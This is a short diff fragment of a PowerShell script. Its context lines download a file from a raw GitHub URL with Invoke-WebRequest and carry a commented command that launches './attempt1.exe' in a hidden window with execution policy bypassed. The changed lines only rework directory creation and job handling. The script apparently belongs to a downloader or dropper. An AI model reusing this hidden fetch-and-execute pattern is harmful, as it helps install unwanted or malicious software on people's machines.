@@ -64,17 +64,9 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 
 #powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
-mkdir $rig
-cd $rig
 
-
-
-Write-Host "Downloads started..."
-Wait-Job -Job $jobs
-
-foreach ($job in $jobs) {
-    Receive-Job -Job $job
-}
+New-Item -Name "$wd" -Path "$path" -ItemType Directory
+echo $wd
 
 
 
